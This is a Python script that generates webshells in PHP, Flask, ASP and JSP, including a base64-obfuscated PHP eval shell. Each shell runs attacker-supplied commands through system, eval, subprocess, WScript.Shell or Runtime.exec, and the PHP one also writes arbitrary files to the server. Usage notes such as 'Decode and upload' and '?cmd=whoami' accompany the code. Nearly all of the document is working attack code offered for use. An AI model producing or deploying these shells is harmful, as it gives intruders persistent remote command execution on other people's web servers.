#!/usr/bin/env python3
"""
Webshell Payload Generator
Author: Security Research Team
"""

import base64

def generate(language: str = "php", obfuscation: bool = False, **kwargs) -> str:
    """Generate webshell payload"""
    
    if language.lower() == "php":
        return generate_php_webshell(obfuscation)
    elif language.lower() == "python":
        return generate_python_webshell(obfuscation)
    elif language.lower() == "asp":
        return generate_asp_webshell(obfuscation)
    elif language.lower() == "jsp":
        return generate_jsp_webshell(obfuscation)
    else:
        return generate_php_webshell(obfuscation)


def generate_php_webshell(obfuscated: bool = False) -> str:
    """Generate PHP webshell"""
    
    if obfuscated:
        # Base64 encoded simple webshell
        shell = """<?php eval(base64_decode($_POST['cmd'])); ?>"""
        encoded = base64.b64encode(shell.encode()).decode()
        return f"""
Obfuscated PHP Webshell (Base64):
{encoded}

Decode and upload. Use: POST parameter 'cmd' with base64 encoded PHP code.
"""
    
    # Standard PHP webshell
    shell = """<?php
// Simple PHP Webshell
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

if(isset($_POST['cmd'])) {
    echo "<pre>";
    eval($_POST['cmd']);
    echo "</pre>";
}

if(isset($_POST['upload'])) {
    file_put_contents($_POST['file'], base64_decode($_POST['content']));
    echo "File uploaded: " . $_POST['file'];
}
?>"""
    
    return f"""
PHP Webshell:
{shell}

Usage:
  GET: ?cmd=whoami
  POST: cmd=<?php phpinfo(); ?>
  Upload: POST upload=1&file=shell.php&content=<base64_file_content>
"""


def generate_python_webshell(obfuscated: bool = False) -> str:
    """Generate Python webshell (Flask)"""
    
    shell = """#!/usr/bin/env python3
from flask import Flask, request, render_string
import subprocess
import os

app = Flask(__name__)

@app.route('/')
def index():
    cmd = request.args.get('cmd', '')
    if cmd:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return f"<pre>{result.stdout}{result.stderr}</pre>"
        except Exception as e:
            return f"<pre>Error: {e}</pre>"
    return "<form><input name='cmd'><input type='submit'></form>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
"""
    
    return f"""
Python Flask Webshell:
{shell}

Usage:
  python3 webshell.py
  Access: http://target:8080/?cmd=whoami
"""


def generate_asp_webshell(obfuscated: bool = False) -> str:
    """Generate ASP webshell"""
    
    shell = """<%
Response.Buffer = False
On Error Resume Next

Dim cmd
cmd = Request("cmd")

If cmd <> "" Then
    Set WshShell = CreateObject("WScript.Shell")
    Set oExec = WshShell.Exec(cmd)
    Dim output
    output = oExec.StdOut.ReadAll
    Response.Write("<pre>" & output & "</pre>")
End If
%>
<form method="post">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>"""
    
    return f"""
ASP Webshell:
{shell}

Usage:
  Upload as .asp file
  POST: cmd=whoami
"""


def generate_jsp_webshell(obfuscated: bool = False) -> str:
    """Generate JSP webshell"""
    
    shell = """<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
}
%>
<form method="post">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>"""
    
    return f"""
JSP Webshell:
{shell}

Usage:
  Upload as .jsp file
  POST: cmd=whoami
"""


if __name__ == "__main__":
    import sys
    lang = sys.argv[1] if len(sys.argv) > 1 else "php"
    obfuscate = len(sys.argv) > 2 and sys.argv[2].lower() == "true"
    print(generate(lang, obfuscate))
